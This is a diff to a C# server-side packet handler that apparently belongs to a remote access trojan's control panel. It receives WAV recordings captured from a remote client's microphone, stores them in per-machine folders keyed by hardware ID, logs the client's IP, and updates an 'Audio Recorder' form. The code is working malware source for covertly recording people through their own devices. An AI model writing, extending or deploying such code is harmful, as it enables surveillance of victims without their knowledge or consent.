@@ -20,16 +20,30 @@ namespace Server.Handle_Packet
         {
             try
             {
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "SaveAudio");
-                if (!Directory.Exists(fullPath))
-                    Directory.CreateDirectory(fullPath);
-                await Task.Run(() =>
+                FormAudio audiorecord = (FormAudio)Application.OpenForms["Audio Recorder:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
+                if (unpack_msgpack.ForcePathObject("Close").GetAsString() == "true")
                 {
-                    byte[] zipFile = unpack_msgpack.ForcePathObject("WavFile").GetAsBytes();
-                    File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav", zipFile);
-                });
-                new HandleLogs().Addmsg($"Client {client.Ip} recording success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/SaveAudio", Color.Purple);
-                client.Disconnected();
+                    audiorecord.btnStartStopRecord.Text = "Start Recording";
+                    audiorecord.btnStartStopRecord.Enabled = true;
+                    client.Disconnected();
+                    return;
+                }
+                else 
+                {
+                    audiorecord.btnStartStopRecord.Text = "Start Recording";
+                    audiorecord.btnStartStopRecord.Enabled = true;
+
+                    string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "SaveAudio");
+                    if (!Directory.Exists(fullPath))
+                        Directory.CreateDirectory(fullPath);
+                    await Task.Run(() =>
+                    {
+                        byte[] zipFile = unpack_msgpack.ForcePathObject("WavFile").GetAsBytes();
+                        File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav", zipFile);
+                    });
+                    new HandleLogs().Addmsg($"Client {client.Ip} recording success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/SaveAudio", Color.Purple);
+                    client.Disconnected();
+                }
             }
             catch (Exception ex)
             {
